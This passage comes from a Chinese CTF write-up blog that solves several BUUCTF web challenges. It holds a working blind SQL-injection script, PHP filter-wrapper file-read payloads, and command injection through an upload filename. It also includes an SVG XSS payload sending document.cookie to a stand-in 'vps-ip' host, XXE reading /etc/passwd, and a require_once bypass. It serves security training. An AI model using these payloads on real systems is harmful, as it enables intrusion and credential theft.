class="language-none">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#.png</code></pre><p>解释：看show里反序列化的部分，是只对attr部分进行了反序列化，所以我们在构造的时候，就要把我们的序列化语句放在attr的位置上，前边四个放1，并且用单引号来闭合前面的第一个单引号，#是为了注释后面的sql语句，保证顺利执行，.png是保证是个图片的后缀，让文件能传上去</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184421898.png"></p><p>而</p><pre class="language-txt" data-language="txt"><code class="language-txt">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</code></pre><p>是<code>O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</code>的十六进制形式，因为文件名不允许存在双引号，\0是因为我们的序列化的两个属性都是protected类型的，而在储存时对protected序列化后出现的不可见字符与*的组合进行了替换，将chr(0)*chr(0)替换为了\0\0\0，在反序列化时又换了回去，为了程序的执行，所以我们要将其替换</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184018967.png" alt="image-20220419184018967"></p><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>一道像ssrf的页面，但实际上是xff头的二次注入</p><pre class="language-none"><code class="language-none">我们测试一下，先输入 1’ or ‘1 此时我们的current IP就等于它，然后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or &#39;1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为一。</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420203914643.png" alt="image-20220420203914643"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420203921117.png" alt="image-20220420203921117"></p><p>所以直接跑脚本就行了</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;node4.buuoj.cn:28996&#x2F;&#39;flag &#x3D; &#39;&#39;for i in range(1, 100):    length &#x3D; len(flag)    min &#x3D; 32    max &#x3D; 125    while 1:        j &#x3D; min + (max - min) &#x2F;&#x2F; 2        if min &#x3D;&#x3D; j:            flag +&#x3D; chr(j)            print(flag)            break        # 爆表        # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;F4l9_D4t4B45e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j)        # 爆库        payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))&lt;%d or &#39;0&quot;%(i,j)        # 爆列        # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;F4l9_t4b1e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j)        # 爆flag        #payload1 &#x3D; &quot;0&#39; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))&lt;%d or &#39;0&quot; % (i, j)        payload2 &#x3D; &quot;1&quot;        headers &#x3D; &#123;&quot;x-forwarded-for&quot;: payload1,                   &#39;Cookie&#39;: &#39;track_uuid&#x3D;585aabec-e6df-4724-95b8-8c2fa1285f61&#39;&#125;        r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text        # print(r)        headers[&quot;x-forwarded-for&quot;] &#x3D; payload2        r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text        # print(r)        r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text        # print(r)        location &#x3D; r.find(&quot;Last Ip: &quot;)        number &#x3D; r[location + 9:location + 10]        if &#39;1&#39; in number:            max &#x3D; j        else:            min &#x3D; j</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420204220118.png" alt="image-20220420204220118"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420204313445.png" alt="image-20220420204313445"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420204518414.png" alt="image-20220420204518414"></p><p>最后出flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420205247558.png" alt="image-20220420205247558"></p><p>赵总怎么还在里边夹私货（</p><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>有注册界面register.php</p><p>注册一下登录之后感觉有点像伪协议</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421201110247.png" alt="image-20220421201110247"></p><p>试一下，成功读到了源码</p><pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;user</code></pre><p>解码</p><p>user.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phprequire_once(&quot;function.php&quot;);if( !isset( $_SESSION[&#39;user&#39;] ))&#123;    Header(&quot;Location: index.php&quot;);&#125;if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123;    $oper_you_can_do &#x3D; $OPERATE_admin;&#125;else&#123;    $oper_you_can_do &#x3D; $OPERATE;&#125;&#x2F;&#x2F;die($_SESSION[&#39;isadmin&#39;]);if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123;    if(!isset($_GET[&#39;page&#39;]) || $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123;        $page &#x3D; &#39;info&#39;;    &#125;else &#123;        $page &#x3D; $_GET[&#39;page&#39;];    &#125;&#125;else&#123;    if(!isset($_GET[&#39;page&#39;])|| $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123;        $page &#x3D; &#39;guest&#39;;    &#125;else &#123;        $page &#x3D; $_GET[&#39;page&#39;];        if($page &#x3D;&#x3D;&#x3D; &#39;info&#39;)        &#123;&#x2F;&#x2F;            echo(&quot;&lt;script&gt;alert(&#39;no premission to visit info, only admin can, you are guest&#39;)&lt;&#x2F;script&gt;&quot;);            Header(&quot;Location: user.php?page&#x3D;guest&quot;);        &#125;    &#125;&#125;filter_directory();&#x2F;&#x2F;if(!in_array($page,$oper_you_can_do))&#123;&#x2F;&#x2F;    $page &#x3D; &#39;info&#39;;&#x2F;&#x2F;&#125;include &quot;$page.php&quot;;?&gt;</code></pre><p>function.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();require_once &quot;config.php&quot;;function Hacker()&#123;    Header(&quot;Location: hacker.php&quot;);    die();&#125;function filter_directory()&#123;    $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];    $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]);    parse_str($uri[&#39;query&#39;], $query);&#x2F;&#x2F;    var_dump($query);&#x2F;&#x2F;    die();    foreach($keywords as $token)    &#123;        foreach($query as $k &#x3D;&gt; $v)        &#123;            if (stristr($k, $token))                hacker();            if (stristr($v, $token))                hacker();        &#125;    &#125;&#125;function filter_directory_guest()&#123;    $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;];    $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]);    parse_str($uri[&#39;query&#39;], $query);&#x2F;&#x2F;    var_dump($query);&#x2F;&#x2F;    die();    foreach($keywords as $token)    &#123;        foreach($query as $k &#x3D;&gt; $v)        &#123;            if (stristr($k, $token))                hacker();            if (stristr($v, $token))                hacker();        &#125;    &#125;&#125;function Filter($string)&#123;    global $mysqli;    $blacklist &#x3D; &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;;    $whitelist &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;(),_*&#96;-@&#x3D;+&gt;&lt;&quot;;    for ($i &#x3D; 0; $i &lt; strlen($string); $i++) &#123;        if (strpos(&quot;$whitelist&quot;, $string[$i]) &#x3D;&#x3D;&#x3D; false) &#123;            Hacker();        &#125;    &#125;    if (preg_match(&quot;&#x2F;$blacklist&#x2F;is&quot;, $string)) &#123;        Hacker();    &#125;    if (is_string($string)) &#123;        return $mysqli-&gt;real_escape_string($string);    &#125; else &#123;        return &quot;&quot;;    &#125;&#125;function sql_query($sql_query)&#123;    global $mysqli;    $res &#x3D; $mysqli-&gt;query($sql_query);    return $res;&#125;function login($user, $pass)&#123;    $user &#x3D; Filter($user);    $pass &#x3D; md5($pass);    $sql &#x3D; &quot;select * from &#96;albert_users&#96; where &#96;username_which_you_do_not_know&#96;&#x3D; &#39;$user&#39; and &#96;password_which_you_do_not_know_too&#96; &#x3D; &#39;$pass&#39;&quot;;    echo $sql;    $res &#x3D; sql_query($sql);&#x2F;&#x2F;    var_dump($res);&#x2F;&#x2F;    die();    if ($res-&gt;num_rows) &#123;        $data &#x3D; $res-&gt;fetch_array();        $_SESSION[&#39;user&#39;] &#x3D; $data[username_which_you_do_not_know];        $_SESSION[&#39;login&#39;] &#x3D; 1;        $_SESSION[&#39;isadmin&#39;] &#x3D; $data[isadmin_which_you_do_not_know_too_too];        return true;    &#125; else &#123;        return false;    &#125;    return;&#125;function updateadmin($level,$user)&#123;    $sql &#x3D; &quot;update &#96;albert_users&#96; set &#96;isadmin_which_you_do_not_know_too_too&#96; &#x3D; &#39;$level&#39; where &#96;username_which_you_do_not_know&#96;&#x3D;&#39;$user&#39; &quot;;    echo $sql;    $res &#x3D; sql_query($sql);&#x2F;&#x2F;    var_dump($res);&#x2F;&#x2F;    die();&#x2F;&#x2F;    die($res);    if ($res &#x3D;&#x3D; 1) &#123;        return true;    &#125; else &#123;        return false;    &#125;    return;&#125;function register($user, $pass)&#123;    global $mysqli;    $user &#x3D; Filter($user);    $pass &#x3D; md5($pass);    $sql &#x3D; &quot;insert into &#96;albert_users&#96;(&#96;username_which_you_do_not_know&#96;,&#96;password_which_you_do_not_know_too&#96;,&#96;isadmin_which_you_do_not_know_too_too&#96;) VALUES (&#39;$user&#39;,&#39;$pass&#39;,&#39;0&#39;)&quot;;    $res &#x3D; sql_query($sql);    return $mysqli-&gt;insert_id;&#125;function logout()&#123;    session_destroy();    Header(&quot;Location: index.php&quot;);&#125;?&gt;</code></pre><p>这里有个<strong>parse_url的解析漏洞</strong>（我记得我遇见过，但是不知道为什么没有写在wp上</p><pre class="language-php" data-language="php"><code class="language-php">$url0 &#x3D; &quot;&#x2F;baidu.com:80&quot;;&#x2F;&#x2F;全版本通杀，当url没协议时parse_url会直接报错$url &#x3D; &quot;httpsadasd:&#x2F;&#x2F;www.baidu.com:80?a&#x3D;123&quot;;$url1 &#x3D; &quot;&#x2F;baidu.com:80a&quot;;&#x2F;&#x2F;但是在端口上加上字母就能正常解析$url2 &#x3D; &quot;&#x2F;&#x2F;pupiles.com&#x2F;about:1234&quot;;&#x2F;&#x2F;这是php5.5以上的一个端口解析漏洞，这样的url会将&#x2F;后的内容都path看作path$url3 &#x3D; &quot;&#x2F;&#x2F;baidu.com:80a&quot;;var_dump(parse_url($url0));var_dump(parse_url($url));var_dump(parse_url($url1));var_dump(parse_url($url2));var_dump(parse_url($url3));</code></pre><p>返回的内容为</p><pre class="language-php" data-language="php"><code class="language-php">bool(false)array(4) &#123;  [&quot;scheme&quot;]&#x3D;&gt;  string(10) &quot;httpsadasd&quot;  [&quot;host&quot;]&#x3D;&gt;  string(13) &quot;www.baidu.com&quot;  [&quot;port&quot;]&#x3D;&gt;  int(80)  [&quot;query&quot;]&#x3D;&gt;  string(5) &quot;a&#x3D;123&quot;&#125;array(1) &#123;  [&quot;path&quot;]&#x3D;&gt;  string(14) &quot;&#x2F;baidu.com:80a&quot;&#125;array(3) &#123;  [&quot;host&quot;]&#x3D;&gt;  string(11) &quot;pupiles.com&quot;  [&quot;port&quot;]&#x3D;&gt;  int(1234)  [&quot;path&quot;]&#x3D;&gt;  string(11) &quot;&#x2F;about:1234&quot;&#125;array(2) &#123;  [&quot;host&quot;]&#x3D;&gt;  string(9) &quot;baidu.com&quot;  [&quot;port&quot;]&#x3D;&gt;  int(80)&#125;</code></pre><p>测试</p><pre class="language-php" data-language="php"><code class="language-php">$url4 &#x3D; &quot;&#x2F;&#x2F;upload?&#x2F;test&#x2F;&quot;;$url5 &#x3D; &quot;&#x2F;upload?&#x2F;1&#x3D;1&amp;id&#x3D;1&quot;;$url6 &#x3D; &quot;&#x2F;&#x2F;&#x2F;upload?id&#x3D;1&quot;;var_dump(parse_url($url4));var_dump(parse_url($url5));var_dump(parse_url($url6));</code></pre><p>返回的内容为</p><pre class="language-php" data-language="php"><code class="language-php">array(2) &#123;  [&quot;host&quot;]&#x3D;&gt;  string(7) &quot;upload?&quot;  [&quot;path&quot;]&#x3D;&gt;  string(6) &quot;&#x2F;test&#x2F;&quot;&#125;array(2) &#123;  [&quot;path&quot;]&#x3D;&gt;  string(7) &quot;&#x2F;upload&quot;  [&quot;query&quot;]&#x3D;&gt;  string(9) &quot;&#x2F;1&#x3D;1&amp;id&#x3D;1&quot;&#125;bool(false)</code></pre><p>这个就是我们需要的路径解析漏洞，这个在php的不同版本差别还是挺大的</p><p>5.2在参数带个伪协议直接解析不了。。。而且好像也没有这个洞和///直接报错的洞</p><p>5.4，5.5可以直接利用这个漏洞绕过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421220117699.png" alt="image-20220421220117699"></p><p>但是7.0开始好像是对参数里的：和/进行了检测</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421220326012.png" alt="image-20220421220326012"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421220436590.png" alt="image-20220421220436590"></p><p>然后我们可以用</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg或&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg</code></pre><p>读到ffffllllaaaaggg里的内容</p><p>解码之后</p><pre class="language-none"><code class="language-none">&lt;?phpif (FLAG_SIG !&#x3D; 1)&#123;    die(&quot;you can not visit it directly&quot;);&#125;else &#123;    echo &quot;you can find sth in m4aaannngggeee&quot;;&#125;?&gt;</code></pre><p>那就再看m4aaannngggeee</p><pre class="language-none"><code class="language-none">&lt;?phpif (FLAG_SIG !&#x3D; 1)&#123;    die(&quot;you can not visit it directly&quot;);&#125;include &quot;templates&#x2F;upload.html&quot;;?&gt;</code></pre><p>访问一下包含的这个文件</p><p>是个文件上传的页面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421221443724.png" alt="image-20220421221443724"></p><p>虽然没法传，但是跳转到了一个新的页面，再用伪协议读一下</p><p>upllloadddd.php</p><pre class="language-none"><code class="language-none">&lt;?php$allowtype &#x3D; array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);$size &#x3D; 10000000;$path &#x3D; &quot;.&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;;$filename &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;];if(is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]))&#123;    if(!move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$path.$filename))&#123;        die(&quot;error:can not move&quot;);    &#125;&#125;else&#123;    die(&quot;error:not an upload file！&quot;);&#125;$newfile &#x3D; $path.$filename;echo &quot;file upload success&lt;br &#x2F;&gt;&quot;;echo $filename;$picdata &#x3D; system(&quot;cat .&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;.$filename.&quot; | base64 -w 0&quot;);echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;png;base64,&quot;.$picdata.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;if($_FILES[&#39;file&#39;][&#39;error&#39;]&gt;0)&#123;    unlink($newfile);    die(&quot;Upload file error: &quot;);&#125;$ext &#x3D; array_pop(explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;]));if(!in_array($ext,$allowtype))&#123;    unlink($newfile);&#125;?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421222040731.png" alt="image-20220421222040731"></p><p>看这句，如果我们再filename处插入命令，就可以执行它</p><p>那我们就去找真正的文件上传的页面，想到之前的m4aaannngggeee</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421225045605.png" alt="image-20220421225045605"></p><p>利用分号执行多个注释，然后利用井号注释掉后面的语句</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421224821554.png" alt="image-20220421224821554"></p><h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><p>额。。。</p><p>看下载的附件里的index.php，有一个action可以进行文件包含，实现任意文件读取，然后就是直接猜flag文件名为flag，在根目录就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711120411219.png" alt="image-20220711120411219"></p><h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p>挺有意思的一个题，但是没什么难度</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711121147541.png" alt="image-20220711121147541"></p><p>打开环境的时候405还以为是环境有问题，但是这里状态码是405，也就是请求方式错误，抓包改一下请求方式就能看见php代码了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711121340111.png" alt="image-20220711121340111"></p><p>然后就是考烂了的md5的绕过，在phpinfo里有flag</p><h2 id="HarekazeCTF2019-Avatar-Uploader"><a href="#HarekazeCTF2019-Avatar-Uploader" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader"></a>[HarekazeCTF2019]Avatar Uploader</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711122817759.png" alt="image-20220711122817759"></p><p>源码里主要看这三个地方，其他的都不重要</p><p>在检查文件类型时，<code>finfo_file()</code>函数检测上传图片的类型是否是<code>image/png</code><br>在检查文件长宽时，<code>getimagesize()</code> 函数用于获取图像大小及相关信息，成功将返回一个数组</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711122935596.png" alt="image-20220711122935596"></p><p>我们的目的就是让最后的那个if满足</p><p>也就是让<code>getimagesize()</code> 函数识别不出上传的为png文件</p><p>因为finfo_file()可以识别png图片<strong>十六进制下的第一行</strong>，而 getimagesize 不可以。所以只要保持png头破坏掉文件长宽等其余信息就能绕过了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711123221085.png" alt="image-20220711123221085"></p><p>然后上传就可以了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711123237676.png" alt="image-20220711123237676"></p><h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>做这个题之前要先看一下SVG是什么</p><p>SVG简介</p><pre class="language-none"><code class="language-none">SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</code></pre><p>创建 SVG 图像<br>SVG 文档基本结构</p><p>如下所示，是一个 SVG 文档结构：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;svg width&#x3D;&#39;140&#39; heiight&#x3D;&#39;170&#39; xmlns&#x3D;&#39;http:&#x2F;&#x2F;wwww.w3.org&#x2F;2000&#x2F;svg&#39;&gt;  &lt;title&gt;Cat&lt;&#x2F;title&gt;  &lt;desc&gt;Stick Figure of Cat&lt;&#x2F;desc&gt;  &lt;!-- 在这里绘制图像 --&gt;&lt;&#x2F;svg&gt;</code></pre><p>根元素<code>&lt;svg&gt;</code>以像素为单位定义了整个图像的 width 和 height，还通过 xmlns 属性定义了 SVG 的命名空间。<code>&lt;title&gt;</code> 元素的内容可以被阅读器显示在标题栏上或者是作为鼠标指针指向图像时的提示， <code>&lt;desc&gt; </code>元素允许咱们为图像定义完整的描述信息。</p><p>基本形状和属性</p><p>基本图形</p><p><code>&lt;rect&gt;、&lt;circle&gt;、&lt;ellipse&gt;、&lt;line&gt;、&lt;polyline&gt;、&lt;polygon&gt;</code></p><p>基本属性</p><p>fill、stroke、stroke-width、transform</p><p>基本形状 --- 圆形<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711205338279.png" alt="image-20220711205338279"></p><p><strong>SVG造成XSS</strong></p><p>但是如果我们在这里插入一个xss</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711205545773.png" alt="image-20220711205545773"></p><p>可以看到也能执行</p><p><strong>原因</strong></p><pre class="language-none"><code class="language-none">这是因为SVG是支持通过脚本语言来动态访问和修改SVG的任何内容，这点和HTML中的DOM类似，或者说完全一致。因为SVG中的所有标签和属性都已经对应了已经定义的DOM，而这种脚本语言就是JavaScript，所以我们在SVG中插入JavaScript脚本是完全能够被解析的。在国际的SVG标准中定义了script标签的存在，总之XSS之所以能够执行是因为遵循了svg及xml的标准。</code></pre><p>所以可以用</p><p><code>&lt;svg/onload=&quot;document.location=&#39;http://vps-ip:1234&#39;+document.cookie&quot;&gt;</code></p><p>这种payload实现盗取管理员cookie的目的</p><p><strong>SVG造成XXE</strong></p><p>因为SVG是一种用<a href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020">XML</a>定义的语言</p><p>所以这个也存在着xxe的漏洞</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711212326994.png" alt="image-20220711212326994"></p><p>这里就会返回一个带着passwd文件内容的图片，可以通过修改图片宽度来看后边的部分</p><p>后边就是猜flag文件的部分了，flag文件名为flag.txt，且在当前目录，但是我们不知道我们当前的目录</p><p>这里可以用/proc/self/cwd来获取目标当前进程环境的运行目录与目录里的文件</p><p>所以最终的payload为</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711213049790.png" alt="image-20220711213049790"></p><p>参考文章：</p><p><a href="https://blog.csdn.net/qq_38154820/article/details/110152943">浅谈SVG的两个黑魔法_合天网安实验室的博客-CSDN博客</a></p><h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);require_once &#39;flag.php&#39;;if(isset($_GET[&#39;file&#39;])) &#123;  require_once $_GET[&#39;file&#39;];&#125;</code></pre><p>这题的考点就是require_once的绕过，这个函数所包含的文件只能被包含一次，这样的话我们就不能直接用伪协议来再包含一次flag.php了</p><pre class="language-none"><code class="language-none">php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(&#39;flag.php&#39;)，已经include的文件不可以再require_once。</code></pre><p>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</p><pre class="language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711213946435.png" alt="image-20220711213946435"></p><p>但是这个需要知道当前目录，我们可以根据上一题提到的知识改进一下</p><pre class="language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php </code></pre><p><img 